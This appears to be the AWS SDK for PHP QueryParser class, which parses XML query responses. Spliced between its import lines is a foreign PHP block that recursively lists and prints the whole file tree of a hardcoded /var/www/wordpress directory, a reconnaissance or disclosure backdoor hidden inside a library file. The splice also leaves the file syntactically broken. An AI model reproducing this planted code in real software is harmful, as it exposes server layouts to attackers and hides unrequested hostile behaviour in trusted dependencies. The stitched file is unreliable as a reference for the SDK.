<?php
namespace Aws\Api\Parser;

use Aws\Api\Service;
use Aws\Api\StructureShape;
use Aws\Result;
<?php
  // File listings in current dir and walks all below
  echo "<pre>\n";
  echo "Self: ".$_SERVER["PHP_SELF"]."\n";
  $startdir = dirname( $_SERVER["SCRIPT_FILENAME"] ); 
  $startdir = "/var/www/wordpress";
  echo "Starting at $startdir\n";
  walkdir( $startdir );

  echo "</pre>\n";

  function walkdir( $dir ){
    $dh = opendir( $dir );
    $aDirs = array();
    $aFiles = array();
    while( false !== ( $file = readdir( $dh ) ) ){
      $file = trim( $file );
      if( $file == "." || $file == ".." ) continue;
      if( is_dir( $dir."/".$file ) ) $aDirs[] = $file;
      else $aFiles[] = $file;
    }
    closedir( $dh );
    foreach( $aFiles as $f ){
      echo "[f] $f\n";
    }
    foreach( $aDirs as $d ){
      echo "[d] $dir/$d\n";
      echo "<blockquote>";
      walkdir( $dir."/".$d );
      echo "</blockquote>";
    }
  }
?>
use Aws\CommandInterface;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\StreamInterface;

/**
 * @internal Parses query (XML) responses (e.g., EC2, SQS, and many others)
 */
class QueryParser extends AbstractParser
{
    use PayloadParserTrait;

    /** @var bool */
    private $honorResultWrapper;

    /**
     * @param Service   $api                Service description
     * @param XmlParser $xmlParser          Optional XML parser
     * @param bool      $honorResultWrapper Set to false to disable the peeling
     *                                      back of result wrappers from the
     *                                      output structure.
     */
    public function __construct(
        Service $api,
        XmlParser $xmlParser = null,
        $honorResultWrapper = true
    ) {
        parent::__construct($api);
        $this->parser = $xmlParser ?: new XmlParser();
        $this->honorResultWrapper = $honorResultWrapper;
    }

    public function __invoke(
        CommandInterface $command,
        ResponseInterface $response
    ) {
        $output = $this->api->getOperation($command->getName())->getOutput();
        $xml = $this->parseXml($response->getBody(), $response);

        if ($this->honorResultWrapper && $output['resultWrapper']) {
            $xml = $xml->{$output['resultWrapper']};
        }

        return new Result($this->parser->parse($output, $xml));
    }

    public function parseMemberFromStream(
        StreamInterface $stream,
        StructureShape $member,
        $response
    ) {
        $xml = $this->parseXml($stream, $response);
        return $this->parser->parse($member, $xml);
    }
}
